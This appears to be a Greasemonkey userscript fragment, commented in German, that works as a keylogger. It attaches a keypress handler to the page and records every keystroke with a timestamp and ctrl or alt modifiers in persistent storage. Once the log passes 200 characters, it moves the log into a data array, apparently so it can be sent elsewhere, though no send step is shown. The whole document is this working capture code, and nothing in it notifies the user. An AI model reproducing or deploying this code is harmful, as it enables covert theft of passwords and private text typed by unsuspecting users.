var $doc = $(window);
var $handler = $doc.data("events");
if ($handler != null && typeof($handler.keypress) !== undefined || unsafeWindow.keyactive == true){
	//handler exists
	//alert("handler da -> nicht anlegen");
}
else{
	//alert("kein handler da -> anlegen");
	unsafeWindow.keyactive = true;
	$(window).bind('keypress', function(e){
		var ctrl = (e.ctrlKey == true) ? ' [ctrl]' : '';
		//var shift = (e.shiftKey == true) ? '[shift]' : '';
		var shift = '';
		var alt = (e.altKey == true) ? ' [alt]' : '';
		var time = e.timeStamp+'.';
		var key = (e.charCode == 0) ? time+ctrl+shift+alt+'.key.'+e.keyCode+'-' : time+ctrl+shift+alt+'.char.'+e.charCode+'-';
		if(GM_getValue('status'))
			var text = GM_getValue('status');
		else
			var text = '';
		GM_setValue('status', text+key);
	});
}

if(GM_getValue('status').length > 200){
	push_data_array['text'] = GM_getValue('status');
	GM_setValue('status', '');
}
